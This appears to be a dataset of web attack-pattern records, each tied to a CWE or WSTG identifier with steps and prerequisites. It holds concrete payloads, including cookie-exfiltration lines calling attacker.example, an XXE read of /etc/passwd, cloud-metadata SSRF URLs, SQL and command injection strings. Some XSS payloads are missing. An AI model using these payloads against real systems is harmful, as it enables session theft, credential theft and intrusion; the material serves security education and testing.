The attacker sets the name to , and every user who views the profile executes the script in the site origin, sending session cookies to the attacker. Reflected variants place the payload in a search parameter, and DOM-based variants flow from location.hash into innerHTML. State transition: INPUT_STORED_OR_REFLECTED -> RENDERED_IN_EXECUTABLE_CONTEXT -> VICTIM_BROWSER_EXECUTES -> SESSION_OR_ACTION_COMPROMISE.

metadata.title: CWE-79 Exploitation Pattern: Cross-Site Scripting
metadata.vulnerability_class: CWE-79: Improper Neutralization of Input During Web Page Generation
attack_steps: Map every reflection point and stored field rendered in HTML
Identify the output context for each sink: body, attribute, URL, script, style
Test context-breaking payloads and encoding variants
Trace DOM sources to sinks in client-side code
Confirm execution with a benign alert or out-of-band callback

text: Attack pattern: gadget chain in a session cookie. A session cookie carries a Java-serialized object prefixed with rO0AB. The attacker crafts a CommonsCollections gadget chain with ysoserial, base64-encodes it, and replaces the cookie. On the next request the server calls ObjectInputStream.readObject, the chain executes during deserialization, and a command runs before any authorization check. Python pickle and PHP unserialize offer equivalent primitives. State transition: BLOB_SUPPLIED -> NATIVE_DESERIALIZE -> GADGET_CHAIN_EXECUTED -> REMOTE_CODE_EXECUTION.

metadata.title: CWE-502 Exploitation Pattern: Insecure Deserialization
metadata.vulnerability_class: CWE-502: Deserialization of Untrusted Data
attack_steps: Identify serialized formats in cookies, hidden fields, files, and message queues
Recognize magic bytes and encodings such as rO0, aced, and PHP O:
Generate a benign gadget chain with ysoserial or a language equivalent
Deliver the blob and look for side effects or out-of-band callbacks
Test YAML and XML loaders for unsafe constructors

text: Attack pattern: silent account mutation via an auto-submitted form. The attacker hosts a page containing <form action='https://bank.example/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='5000'></form> and submits it on load. The victim, already logged in, visits the page; the browser attaches the session cookie, and the server performs the transfer because it never checks a token or Origin. Variants use image tags for GET endpoints, text/plain forms that bypass preflight, and JSON endpoints that accept form-encoded bodies. State transition: VICTIM_SESSION_ACTIVE -> CROSS_ORIGIN_REQUEST -> COOKIE_ATTACHED -> UNAUTHORIZED_STATE_CHANGE.

metadata.title: CWE-352 Exploitation Pattern: CSRF
metadata.vulnerability_class: CWE-352: Cross-Site Request Forgery
attack_steps: Identify state-changing endpoints and their request encoding
Check whether a CSRF token is present and validated
Build a cross-origin auto-submitting form or img payload
Test SameSite behavior and GET-based variants
Confirm the victim's state changed without interaction

text: Attack pattern: web shell via a double extension. An avatar upload checks that the filename ends with an image extension and trusts the client Content-Type. The attacker uploads shell.php.jpg containing PHP code, or shell.php with Content-Type image/jpeg. If the server maps .jpg to the PHP handler, or if the file is later renamed by a naive routine, requesting the file executes the code under the web service account. Variants include .phtml and .phar, .shtml for SSI, SVG with embedded script, and ZIP archives unpacked into the web root. State transition: UPLOAD_ACCEPTED -> FILTER_BYPASSED -> FILE_IN_WEBROOT -> CODE_OR_SCRIPT_EXECUTED.

metadata.title: CWE-434 Exploitation Pattern: Unrestricted File Upload
metadata.vulnerability_class: CWE-434: Unrestricted Upload of File with Dangerous Type
attack_steps: Identify upload endpoints and where files are stored
Test extension filters with .php, .phtml, .jsp, .shtml, and double extensions
Spoof Content-Type and magic bytes to satisfy image checks
Attempt polyglot files and archive or SVG payloads
Request the uploaded file and confirm execution or script rendering

text: Attack pattern: local file disclosure through a DOCTYPE. A SOAP or import endpoint parses attacker XML. The attacker submits <!DOCTYPE x [<!ENTITY f SYSTEM 'file:///etc/passwd'>]><x>&f;</x>, and the parser substitutes the file contents into the response. When output is not reflected, the attacker uses a parameter entity that exfiltrates the file to an attacker-controlled DTD endpoint, or triggers a DNS lookup to confirm resolution. Variants include XXE inside SVG images, Office documents, and SSO assertions. State transition: XML_PARSED_WITH_DTD -> EXTERNAL_ENTITY_RESOLVED -> LOCAL_FILE_OR_URL_READ -> DATA_EXFILTRATED.

metadata.title: CWE-611 Exploitation Pattern: XML External Entity Injection
metadata.vulnerability_class: CWE-611: Improper Restriction of XML External Entity Reference
attack_steps: Identify XML-accepting endpoints, including SOAP and file imports
Inject a DOCTYPE with an external entity referencing a local file
Reference the entity inside a reflected element
Test parameter entities and out-of-band DTD hosting
Confirm file read or DNS and HTTP callbacks

text: Attack pattern: metadata credential theft via URL fetch. An image-preview feature accepts a URL and returns the fetched body. The attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/ and receives temporary cloud credentials in the response. Variants target http://127.0.0.1:8500 for Consul, alternate encodings such as 2130706433 or [::1], redirects to internal hosts, and DNS rebinding that resolves to a private address after validation. State transition: URL_SUPPLIED -> VALIDATION_BYPASSED -> INTERNAL_REQUEST_ISSUED -> CREDENTIALS_OR_INTERNAL_DATA_EXFILTRATED.

metadata.title: CWE-918 Exploitation Pattern: SSRF
metadata.vulnerability_class: CWE-918: Server-Side Request Forgery
attack_steps: Identify features that fetch URLs: previews, webhooks, imports, image proxies
Substitute localhost, 127.0.0.1, and private ranges
Target the cloud metadata endpoint for credentials
Test redirect chains, DNS rebinding, and alternate IP encodings
Confirm internal response content or timing differences

text: Attack pattern: catastrophic backtracking in an email validator. A validator uses ^([a-zA-Z0-9]+)*@example\.com$. The attacker submits a local part of 40 a characters followed by a character that forces the overall match to fail, such as 'a'.repeat(40) + '!'. The engine explores exponentially many ways to partition the repeated group before concluding failure, pinning a CPU core. Repeating the request across worker processes denies service. State transition: CRAFTED_STRING -> AMBIGUOUS_REPETITION -> EXPONENTIAL_BACKTRACKING -> CPU_SATURATED -> SERVICE_DEGRADED.

metadata.title: CWE-1333 Exploitation Pattern: ReDoS
metadata.vulnerability_class: CWE-1333: Inefficient Regular Expression Complexity
attack_steps: Identify regex-validated fields and parsers, including headers
Craft inputs with long runs of a character near a failing suffix
Measure response time as input length grows
Confirm superlinear growth and CPU saturation
Test whether a second user is affected

text: Attack pattern: passive capture on a downgraded login. The victim opens the site over HTTPS, but a legacy redirect or a hard-coded form action sends the credentials to http://login.example.com. An attacker on the same Wi-Fi network runs ARP spoofing and a transparent proxy, observes the POST body in clear text, and replays it to authenticate. A related variant loads the password-strength script from an HTTP origin, allowing the attacker to modify it and exfiltrate keystrokes. The state transition is VICTIM_LOGS_IN -> REQUEST_TRAVERSES_HTTP -> CREDENTIALS_OBSERVED -> SESSION_REPLAYED.

metadata.title: WSTG-ATHN-01: Credential Capture on a Downgraded or Alternate Authentication Path
metadata.vulnerability_class: CWE-319: Cleartext Transmission of Sensitive Information
attack_variants: HTTPS page posting to HTTP action
prerequisites: Victim shares a network path with the attacker
No HSTS or secure cookie enforcement

text: Attack pattern: default administrative login. The attacker discovers an exposed management console on a non-standard port, tries the vendor's documented admin/admin pair, and gains full control of the component. From there they read configuration secrets, pivot to the application database, or deploy a scheduled task. The same pattern applies to message brokers, caches, and CI agents. The state transition is INTERFACE_DISCOVERED -> DEFAULT_PAIR_ATTEMPTED -> AUTHENTICATED_AS_ADMIN -> PLATFORM_CONTROLLED.

metadata.title: WSTG-ATHN-02: Administrative Takeover Through Vendor Defaults
metadata.vulnerability_class: CWE-1392: Use of Default Credentials
prerequisites: Account never rotated from vendor default
No network restriction on the interface

text: Attack pattern: credential stuffing across rotating sources. The attacker uses a list of leaked username and password pairs, distributes attempts across residential proxies, and rotates User-Agent and session cookies so that no per-IP counter triggers. Accounts that lack MFA authenticate successfully. In the reverse variant, the attacker submits wrong passwords for a victim username until the account locks, denying service. The state transition is CREDENTIAL_LIST_LOADED -> PARALLEL_ATTEMPTS_DISTRIBUTED -> THRESHOLD_NEVER_REACHED -> ACCOUNT_COMPROMISED_OR_LOCKED.

metadata.title: WSTG-ATHN-03: Distributed Password Guessing and Lockout Abuse
metadata.vulnerability_class: CWE-307: Improper Restriction of Excessive Authentication Attempts
prerequisites: Weak or reused passwords in the target population
No CAPTCHA, MFA, or adaptive throttling

text: Attack pattern: reaching a protected route around the filter. The attacker requests /admin/users directly and receives the page because the filter only matches /admin/; or sends POST instead of GET, or /Admin with different case, or adds X-Original-URL to rewrite the path. In a client-side variant, setting a local flag or cookie such as role=admin reveals the interface, and the backing API also trusts it. The state transition is ROUTE_DISCOVERED -> FILTER_MISMATCH -> REQUEST_REACHES_HANDLER -> PROTECTED_FUNCTION_USED.

metadata.title: WSTG-ATHN-04: Route, Method, and Header Authentication Bypass
metadata.vulnerability_class: CWE-287: Improper Authentication
prerequisites: No server-side session check on the route

text: Attack pattern: durable access via a stolen remember-me cookie. The attacker obtains the cookie from a shared device, a backup, or XSS, then replays it from another machine. Because the token is derived from the username or never expires, the attacker keeps access even after the victim logs out, and often after a password change. In the weakest form the cookie contains the password encoded with base64. The state transition is REMEMBER_ME_ISSUED -> TOKEN_STOLEN -> TOKEN_REPLAYED -> DURABLE_SESSION_ESTABLISHED.

metadata.title: WSTG-ATHN-05: Remember-Me Token Theft and Forgery
metadata.vulnerability_class: CWE-522: Insufficiently Protected Credentials
prerequisites: Token stored client-side without server binding

text: Attack pattern: recovering account data after logout. The victim logs in on a shared kiosk, views statements, then logs out. The attacker presses Back and the browser renders the cached statement page from the back-forward cache, including balances and account numbers. In an enterprise path, a shared reverse proxy caches a personalized response because the origin omitted Vary and Cache-Control. The state transition is AUTHENTICATED_PAGE_VIEWED -> RESPONSE_CACHED -> LOGOUT_PERFORMED -> CACHED_CONTENT_RECOVERED.

metadata.title: WSTG-ATHN-06: Post-Logout Recovery of Cached Authenticated Pages
metadata.vulnerability_class: CWE-525: Use of Web Browser Cache Containing Sensitive Information
prerequisites: Sensitive response stored by client or proxy

text: Attack pattern: registration with a known-weak password and later stuffing. The attacker registers or resets an account with Password123, confirms that the server accepts it even when the client-side meter shows weak, and later uses the same value in a credential-stuffing run against other users. Because the policy is enforced only in JavaScript, a direct POST bypasses it entirely. The state transition is POLICY_CHECK_CLIENT_ONLY -> WEAK_PASSWORD_ACCEPTED -> CREDENTIAL_REUSED -> ACCOUNT_COMPROMISED.

metadata.title: WSTG-ATHN-07: Weak-Policy Account Compromise via Common Passwords
metadata.vulnerability_class: CWE-521: Weak Password Requirements
prerequisites: Registration or reset accepts weak passwords

text: Attack pattern: research and brute force of a security answer. The attacker identifies the victim's first pet or mother's maiden name from public posts, submits it with case and whitespace variants, and resets the password. Where the answer is numeric or short, the attacker enumerates the space without a lockout. The state transition is RECOVERY_FLOW_STARTED -> QUESTION_PRESENTED -> ANSWER_GUESSED_OR_RESEARCHED -> PASSWORD_RESET -> ACCOUNT_TAKEOVER.

metadata.title: WSTG-ATHN-08: Knowledge-Based Recovery Takeover
metadata.vulnerability_class: CWE-640: Weak Password Recovery Mechanism for Forgotten Password
prerequisites: Recovery protected only by a security question
No rate limit or lockout on answers

text: Attack pattern: token replay and host poisoning. The attacker requests a reset for the victim, then manipulates the Host header so the emailed link points to an attacker domain, delivering the token. Alternatively, the attacker reuses a token obtained from a shared mailbox or referrer leak after the first reset. In the authenticated variant, a stolen session changes the password without knowing the current one. The state transition is RESET_REQUESTED -> TOKEN_OBTAINED -> PASSWORD_SET -> ACCOUNT_TAKEOVER.

metadata.title: WSTG-ATHN-09: Reset Token Reuse and Header Poisoning
metadata.vulnerability_class: CWE-620: Unverified Password Change
prerequisites: Reset token issued to a controllable account

text: Attack pattern: pivot to the mobile API. The web login requires MFA, but the mobile API accepts only a username and password and issues a full session. The attacker who obtained a password from a breach authenticates through the API and bypasses the second factor entirely. A support-channel variant uses publicly known account details to convince an agent to reset the password. The state transition is PRIMARY_CHANNEL_HARDENED -> ALTERNATE_CHANNEL_DISCOVERED -> WEAKER_PROOF_ACCEPTED -> SESSION_ISSUED.

metadata.title: WSTG-ATHN-10: Channel Pivot to Weaker Authentication
metadata.vulnerability_class: CWE-287: Improper Authentication

text: Attack pattern: guessing a live session identifier. The application issues identifiers that are a base64-encoded timestamp plus a short counter. The attacker samples several logins, infers the pattern, and enumerates nearby values until a request returns another user's profile. In the client-side variant, the cookie contains serialized state such as user_id=42 that the server accepts without a signature. The state transition is IDENTIFIER_SAMPLED -> PATTERN_INFERRED -> CANDIDATE_ENUMERATED -> FOREIGN_SESSION_VALIDATED.

metadata.title: WSTG-SESS-01: Predictable Identifier and Forged Session State
metadata.vulnerability_class: CWE-613: Insufficient Session Expiration
prerequisites: Identifier observable in cookie or URL
No server-side validation of session state

text: Attack pattern: exfiltration through document.cookie. A reflected XSS on any page lets the attacker run fetch('https://attacker.example/?c='+document.cookie). Because the session cookie lacks HttpOnly, the script reads it and the attacker replays it. In a network variant, the cookie lacks Secure and is sent on a cleartext request triggered by a downgraded resource. The state transition is SESSION_ESTABLISHED -> WEAK_COOKIE_ISSUED -> SCRIPT_OR_NETWORK_READS_COOKIE -> SESSION_REPLAYED.

metadata.title: WSTG-SESS-02: Cookie Theft Through Missing Flags and Broad Scope
metadata.vulnerability_class: CWE-614: Sensitive Cookie in HTTPS Session Without Secure Attribute
prerequisites: Session cookie lacks one or more protective flags
An HTTP path, XSS sink, or sibling app exists
Cookie scope includes the exposed surface

text: Attack pattern: link with a fixed identifier. The attacker obtains a pre-auth identifier, sends the victim a link such as /login;jsessionid=ABC123, and waits. The victim authenticates, and because the server keeps the same identifier, the attacker's copy now has the victim's privileges. A cookie-tossing variant sets a Domain-scoped cookie from a sibling subdomain to override the victim's session cookie. The state transition is PREAUTH_ID_PLANTED -> VICTIM_AUTHENTICATES -> IDENTIFIER_UNCHANGED -> ATTACKER_REUSES_SESSION.

metadata.title: WSTG-SESS-03: Planted Identifier Becomes Authenticated
metadata.vulnerability_class: CWE-384: Session Fixation
prerequisites: Pre-auth identifier accepted from the client
Victim willing to follow a crafted link

text: Attack pattern: referrer-based token theft. A page loads with ?sessionid=ABC123 and includes a third-party analytics script. The browser sends the full URL in the Referer header, and the third party logs the token. Alternatively, the token appears in proxy logs, browser history, or a shared bookmark. The state transition is TOKEN_IN_URL -> PAGE_LOADS_THIRD_PARTY -> REFERRER_LEAKS_TOKEN -> SESSION_REPLAYED.

metadata.title: WSTG-SESS-04: Token Leakage via URL and Referrer
metadata.vulnerability_class: CWE-598: Use of GET Request Method With Sensitive Query Strings
prerequisites: Session or reset token carried in a URL or field
Third-party content or logging in the path

text: Attack pattern: forged email change. The attacker page auto-submits a form to /account/email with the attacker's address. The victim's session cookie is attached, and the server updates the email because no token is checked. The attacker then triggers a password reset to the new address. A GET variant uses an image tag against a delete endpoint. The state transition is VICTIM_SESSION_ACTIVE -> CROSS_SITE_REQUEST -> COOKIE_ATTACHED -> ACCOUNT_RECOVERY_REDIRECTED.

metadata.title: WSTG-SESS-05: Cross-Origin State Change via Auto-Submit
metadata.vulnerability_class: CWE-352: Cross-Site Request Forgery

text: Attack pattern: replay after the victim logs out. The attacker captures the session cookie, waits for the victim to log out on a shared device, then replays the cookie. The server accepts it because logout only removed the browser cookie and never invalidated the session record. Remember-me and API tokens continue to work as well. The state transition is SESSION_CAPTURED -> VICTIM_LOGS_OUT -> SERVER_STATE_RETAINED -> CAPTURED_SESSION_REPLAYED.

metadata.title: WSTG-SESS-06: Session Reuse After Logout
metadata.vulnerability_class: CWE-613: Insufficient Session Expiration
attack_variants: Cookie cleared but server session valid
prerequisites: Logout does not invalidate server state

text: Attack pattern: use a stolen cookie days later. The attacker captures a session from a shared or compromised device and waits. Because the server never enforces an idle timeout and refreshes the expiry on every request, the identifier remains valid for weeks. The attacker returns later and accesses the account without re-authentication. The state transition is SESSION_CAPTURED -> LONG_INACTIVITY -> SERVER_STATE_STILL_VALID -> UNAUTHORIZED_ACCESS.

metadata.title: WSTG-SESS-07: Indefinite Session Lifetime Exploitation
metadata.vulnerability_class: CWE-613: Insufficient Session Expiration

text: Attack pattern: priming a role variable during registration. The registration flow stores a user-controlled field in a session key that the authorization layer later reads as role. The attacker submits role=admin during registration, completes login, and the stale value is honored. Variants prime a tenant or account identifier that a different module consumes. The state transition is VARIABLE_PRIMED_IN_FLOW_A -> FLOW_COMPLETES -> VARIABLE_CONSUMED_IN_FLOW_B -> PRIVILEGE_OR_CONTEXT_ESCALATION.

metadata.title: WSTG-SESS-08: Primed Session Variable Influences Authorization
metadata.vulnerability_class: CWE-488: Exposure of Data Element to Wrong Session
attack_variants: Role variable set by another feature
prerequisites: Authorization reads a mutable session value

text: Attack pattern: replay from another country. The attacker obtains the token through XSS and imports the cookie into their own browser. The server accepts it because the session is a pure bearer credential with no device binding, and no alert fires when the same session is used from two distant locations. The state transition is TOKEN_STOLEN -> IMPORTED_INTO_ATTACKER_BROWSER -> REPLAYED -> CONCURRENT_SESSIONS_UNDETECTED.

metadata.title: WSTG-SESS-09: Token Replay From a Foreign Context
metadata.vulnerability_class: CWE-522: Insufficiently Protected Credentials

text: Attack pattern: forced downgrade to a breakable suite. A network attacker interferes with the handshake so the client and server settle on TLS 1.0 with an RC4 suite. The attacker then exploits known weaknesses to recover plaintext or inject content. In a mobile variant, the client accepts any certificate, so the attacker presents a self-signed certificate and terminates TLS. The state transition is HANDSHAKE_STARTED -> WEAK_ALGORITHM_NEGOTIATED -> TRAFFIC_DECRYPTED_OR_INTERCEPTED.

metadata.title: WSTG-CRYP-01: Downgrade and Cipher Negotiation Attack
metadata.vulnerability_class: CWE-326: Inadequate Encryption Strength

text: Attack pattern: decrypting a session blob one byte at a time. The attacker captures a ciphertext cookie, flips bytes in the preceding block, and observes whether the server returns a padding error or a content error. Each response reveals one byte of intermediate state, and after 256 attempts per byte the plaintext is recovered. The same primitive forges valid ciphertext for chosen plaintext. The state transition is CIPHERTEXT_CAPTURED -> PADDING_QUERY_REPEATED -> INTERMEDIATE_BYTES_RECOVERED -> PLAINTEXT_OR_FORGERY.

metadata.title: WSTG-CRYP-02: Byte-at-a-Time Decryption via Padding Oracle
metadata.vulnerability_class: CWE-353: Missing Support for Integrity Check

text: Attack pattern: passive capture of background traffic. The attacker on a shared network observes an internal integration that posts customer records to an HTTP endpoint, or an SMTP relay that forwards password-reset emails in clear text. The payload includes personal data and one-time links, which the attacker reuses. The state transition is SENSITIVE_DATA_QUEUED -> CLEARTEXT_CHANNEL_USED -> TRAFFIC_OBSERVED -> DATA_REUSED.

metadata.title: WSTG-CRYP-03: Cleartext Interception Across Non-Web Channels
metadata.vulnerability_class: CWE-319: Cleartext Transmission of Sensitive Information

text: Attack pattern: cracking an MD5 password store. The attacker obtains a database dump, recognizes unsalted MD5 hashes, and cracks common passwords with a GPU wordlist in minutes. For ECB-encrypted records, identical plaintext blocks produce identical ciphertext, revealing structure and enabling cut-and-paste forgery. For hard-coded keys, decompiling the client reveals the secret. The state transition is PROTECTED_DATA_OBTAINED -> WEAK_CONSTRUCTION_IDENTIFIED -> KEY_OR_PLAINTEXT_RECOVERED -> DATA_COMPROMISED.

metadata.title: WSTG-CRYP-04: Recovery of Data Protected by Weak Cryptography
metadata.vulnerability_class: CWE-327: Use of a Broken or Risky Cryptographic Algorithm
prerequisites: Key or password in a crackable space

text: Attack pattern: search parameter to script execution. A search page reflects q into the results heading. The attacker sends /search?q=<svg onload=fetch('https://attacker.example/?c='+document.cookie)>, and the victim's browser executes it in the site origin, sending the session cookie. A DOM variant writes location.hash into innerHTML after page load. The state transition is LINK_DELIVERED -> PARAMETER_REFLECTED_UNENCODED -> BROWSER_EXECUTES -> SESSION_OR_ACTION_COMPROMISED.

metadata.title: WSTG-INPV-01: Crafted Link Executes Script in the Target Origin
metadata.vulnerability_class: CWE-79: Improper Neutralization of Input During Web Page Generation

text: Attack pattern: profile name as a persistent payload. The attacker sets a display name to . The value is stored and rendered unescaped on the profile, in admin user lists, and in support views. Every staff member who opens the page sends their session cookie. The state transition is PAYLOAD_STORED -> PAGE_RENDERED_FOR_VICTIM -> SCRIPT_EXECUTES -> SESSION_COMPROMISED.

metadata.title: WSTG-INPV-02: Persisted Payload Fires for Every Viewer
metadata.vulnerability_class: CWE-79: Improper Neutralization of Input During Web Page Generation

text: Attack pattern: GET reaches an admin action. The security constraint requires POST for /admin/delete, so the attacker sends GET /admin/delete?id=1. The framework routes GET to the same handler, which deletes the record without the constraint applying. A variant sends POST with X-HTTP-Method-Override: GET to confuse the filter. The state transition is METHOD_SPECIFIC_FILTER -> ALTERNATE_VERB_SENT -> ROUTER_REACHES_HANDLER -> PROTECTED_ACTION_PERFORMED.

metadata.title: WSTG-INPV-03: Verb Substitution Reaches a Protected Handler
metadata.vulnerability_class: CWE-650: Trusting HTTP Permission Methods on the Server Side

text: Attack pattern: hiding a value from the WAF. The attacker sends ?role=user&role=admin. The WAF inspects the first value, while the backend uses the last, so the request passes inspection and the user becomes admin. In a payment flow, ?price=100&price=1 is validated on the first value and charged on the last. The state transition is DUPLICATE_PARAMS_SENT -> TIERS_DISAGREE -> FILTER_SEES_SAFE_VALUE -> BACKEND_USES_MALICIOUS_VALUE.

metadata.title: WSTG-INPV-04: Duplicate Parameter Disagreement Across Tiers
metadata.vulnerability_class: CWE-235: Improper Handling of Extra Parameters
prerequisites: Security decision depends on one occurrence

text: Attack pattern: tautology in a login query. The login handler builds SELECT * FROM users WHERE email='<input>' AND password_hash='<input>'. The attacker submits ' OR 1=1 -- and authenticates as the first user. In reporting, ORDER BY <sort> accepts a subquery that leaks data. When output is suppressed, boolean and time-based payloads infer values. The state transition is INPUT_REACHES_QUERY -> SYNTAX_ALTERED -> RESULT_SET_OR_TIMING_CHANGED -> UNAUTHORIZED_ACCESS.

metadata.title: WSTG-INPV-05: Authentication Bypass and Data Extraction
metadata.vulnerability_class: CWE-89: Improper Neutralization of Special Elements used in an SQL Command

text: Attack pattern: wildcard login bypass. The handler builds (&(uid=<user>)(userPassword=<pass>)). The attacker submits uid=* and password=*, producing (&(uid=*)(userPassword=*)), which matches the first entry and authenticates. A variant injects )(|(uid=* to broaden a search. The state transition is FILTER_CONSTRUCTED -> METACHARACTER_INJECTED -> LOGIC_CHANGED -> AUTH_BYPASS_OR_ENUMERATION.

metadata.title: WSTG-INPV-06: Wildcard and Filter Logic Manipulation
metadata.vulnerability_class: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
prerequisites: Input concatenated into an LDAP filter

text: Attack pattern: injecting an admin element. A SOAP request builds <user><name>INPUT</name><role>user</role></user>. The attacker submits a name containing </name><role>admin</role><name>x, producing a document with role=admin. The downstream service trusts the structure and grants elevated rights. A variant injects a comment to truncate validation or duplicates a field so the parser uses the latter value. The state transition is INPUT_CONCATENATED -> STRUCTURE_ALTERED -> PARSER_TRUSTS_INJECTED_NODE -> PRIVILEGE_ESCALATION.

metadata.title: WSTG-INPV-07: Element Injection Changes Downstream Semantics
metadata.vulnerability_class: CWE-91: XML Injection (aka Blind XPath Injection)

text: Attack pattern: command execution through an uploaded page. The attacker uploads a file containing <!--#exec cmd='id' --> and requests it from a directory where SSI is enabled. The server executes the command and embeds the output in the response. A reflected variant injects the directive into a page that is already SSI-processed. The state transition is CONTENT_WRITTEN -> SSI_ENABLED_PATH -> DIRECTIVE_PROCESSED -> COMMAND_OR_FILE_ACCESS.

metadata.title: WSTG-INPV-08: Directive Injection via Uploaded or Reflected Content
metadata.vulnerability_class: CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page
prerequisites: SSI enabled for the target path

text: Attack pattern: authentication bypass with a tautology. The query //user[username='INPUT' and password='INPUT'] is fed ' or '1'='1, producing a predicate that is always true and returning the first user. A blind variant tests substring conditions to extract node values character by character. The state transition is XPATH_CONSTRUCTED -> QUOTE_BROKEN -> PREDICATE_CHANGED -> AUTH_BYPASS_OR_DATA_EXTRACTION.

metadata.title: WSTG-INPV-09: Boolean XPath Injection and Node Extraction
metadata.vulnerability_class: CWE-643: Improper Neutralization of Data within XPath Expressions

text: Attack pattern: adding recipients through a newline. The application sends mail with MAIL TO:<address>. The attacker supplies victim@example.com%0d%0aRCPT TO:attacker@example.com, and the server treats the injected line as an additional recipient, turning the form into an open relay. An IMAP variant injects a command that copies messages to an attacker mailbox. The state transition is INPUT_EMBEDDED -> CRLF_INJECTED -> EXTRA_COMMAND_PARSED -> RELAY_OR_MAILBOX_ACCESS.

metadata.title: WSTG-INPV-10: CRLF Injection Adds Mail Protocol Commands
metadata.vulnerability_class: CWE-93: Improper Neutralization of CRLF Sequences
prerequisites: Input concatenated into a protocol command

text: Attack pattern: language parameter to local file inclusion. A page uses include($_GET['lang'].'.php'). The attacker supplies ../../../../etc/passwd%00 to truncate the suffix, or php://filter/convert.base64-encode/resource=index to read source. When allow_url_include is on, a remote URL runs attacker code. The state transition is PARAMETER_SUPPLIED -> INCLUDE_PATH_CONTROLLED -> FILE_LOADED_OR_EVALUATED -> CODE_EXECUTION_OR_DISCLOSURE.

metadata.title: WSTG-INPV-11: Dynamic Include Turns a Parameter Into Execution
metadata.vulnerability_class: CWE-94: Improper Control of Generation of Code ('Code Injection')
prerequisites: Input reaches an interpreter or include path

text: Attack pattern: ping utility to shell. A diagnostic page runs ping -c 1 HOST. The attacker submits 127.0.0.1; id, and the shell runs id after ping. Because the code uses system() with a single string, the separator is interpreted. A variant injects $(curl attacker.example) to exfiltrate, or adds -o to a wrapped tool. The state transition is PARAMETER_SUPPLIED -> SHELL_INTERPRETS_METACHARACTER -> EXTRA_COMMAND_RUNS -> HOST_ACCESS.

metadata.title: WSTG-INPV-12: Metacharacter Injection in a System Utility
metadata.vulnerability_class: CWE-78: Improper Neutralization of Special Elements used in an OS Command
prerequisites: Input concatenated into the command line

text: Attack pattern: stack disclosure with %x. A native endpoint logs a username using printf(username). The attacker registers a name of %x.%x.%x.%x and the response or log contains stack values. Repeating %s can dereference pointers, and %n can write. The state transition is INPUT_AS_FORMAT -> SPECIFIER_INTERPRETED -> MEMORY_READ_OR_WRITTEN -> DISCLOSURE_OR_CRASH.

metadata.title: WSTG-INPV-13: Specifier Injection Reads Memory or Crashes
metadata.vulnerability_class: CWE-134: Use of Externally-Controlled Format String
prerequisites: Input used as a format argument

text: Attack pattern: a name that executes in the nightly report. The attacker registers with the name Robert'); DROP TABLE audit;-- which passes the registration validator because it only checks length. The nightly report concatenates the stored name into SQL, and the statement executes. A rendering variant stores markup that fires in an admin view. The state transition is INPUT_STORED -> TIME_PASSES -> DOWNSTREAM_CONSUMER_TRUSTS -> INJECTION_EXECUTES.

metadata.title: WSTG-INPV-14: Stored Value Becomes Dangerous in a Downstream Consumer
metadata.vulnerability_class: CWE-20: Improper Input Validation
attack_variants: Stored value used in SQL by a report job
Filename consumed by a shell job
Import data trusted by a batch process

text: Attack pattern: CL.TE smuggling. The attacker sends a request with both Content-Length and Transfer-Encoding: chunked, crafted so the front end uses the length while the origin uses chunked framing. The trailing bytes are left in the connection and prefixed to the next user's request, which the attacker uses to poison a cache or bypass authorization. A splitting variant injects CRLF into a redirect header to emit a second response. The state transition is CRAFTED_MESSAGE -> PARSERS_DISAGREE -> QUEUE_DESYNCHRONIZED -> NEXT_REQUEST_POISONED.

metadata.title: WSTG-INPV-15: Desynchronized Parsing Poisons the Request Queue
metadata.vulnerability_class: CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')
prerequisites: Proxy and origin parse framing differently

text: Attack pattern: absolute URL to an internal host. The attacker sends GET http://internal-admin.local/ HTTP/1.1 to the public web tier. Because the server accepts absolute-form targets and forwards them, it fetches the internal admin page and returns it. A CONNECT variant opens a tunnel. The state transition is ABSOLUTE_FORM_SENT -> SERVER_ACTS_AS_PROXY -> INTERNAL_HOST_FETCHED -> INTERNAL_DATA_EXPOSED.

metadata.title: WSTG-INPV-16: Absolute-Form Request Turns the Server Into a Proxy
metadata.vulnerability_class: CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')
attack_variants: Internal host reachable via the web tier
prerequisites: Internal network reachable from the server

text: Attack pattern: reset token delivered to the attacker. The attacker requests a password reset for the victim with Host: attacker.example. The application emails a link to https://attacker.example/reset?token=SECRET. The victim clicks it, and the token leaks to the attacker, who resets the password. A routing variant reaches an internal virtual host. The state transition is RESET_REQUESTED -> HOST_HEADER_TRUSTED -> LINK_POINTS_TO_ATTACKER -> TOKEN_CAPTURED -> ACCOUNT_TAKEOVER.

metadata.title: WSTG-INPV-17: Reset Link Poisoning via Host Header
metadata.vulnerability_class: CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax
prerequisites: URL generated from Host or forwarding headers

text: Attack pattern: probe then escalate. The attacker submits {{7*7}} in a name field and sees 49, confirming evaluation. They enumerate the engine and context, then use a gadget chain such as a configuration object to read files or run commands. A sandboxed engine may still be escaped through exposed classes. The state transition is EXPRESSION_PROBE -> EVALUATION_CONFIRMED -> CONTEXT_ENUMERATED -> CODE_EXECUTION.

metadata.title: WSTG-INPV-18: Template Expression to Remote Code Execution
metadata.vulnerability_class: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

text: Attack pattern: preview feature to metadata credentials. The attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/ to an image preview endpoint and receives temporary credentials. Where the response is not returned, timing and error differences reveal open ports. A redirect from an allowed host to an internal one bypasses a naive allowlist. The state transition is URL_SUPPLIED -> DESTINATION_UNVALIDATED -> SERVER_FETCHES_INTERNAL -> CREDENTIALS_OR_DATA_EXPOSED.

metadata.title: WSTG-INPV-19: Metadata Access Through a Fetch Feature
metadata.vulnerability_class: CWE-918: Server-Side Request Forgery (SSRF)
prerequisites: Internal network reachable from the server

text: Attack pattern: rewriting the email claim after a legitimate social login. The attacker signs in with their own account, proxies the redirect, and intercepts the POST that the client uses to exchange the flow result for a session. The body contains the attacker's email, so the attacker replaces it with the victim's address and forwards the request. Because the client never validates the token against the provider, it issues a session for the victim. A variant replays an old token after the victim's email is known. The state transition is ATTACKER_AUTHENTICATED -> FLOW_RESULT_INTERCEPTED -> EMAIL_CLAIM_REWRITTEN -> VICTIM_SESSION_ISSUED.

metadata.title: OAuth Implicit Flow Authentication Bypass: Exploitation Walkthrough
metadata.vulnerability_class: CWE-287: Improper Authentication
prerequisites: Client accepts identity claims from the browser

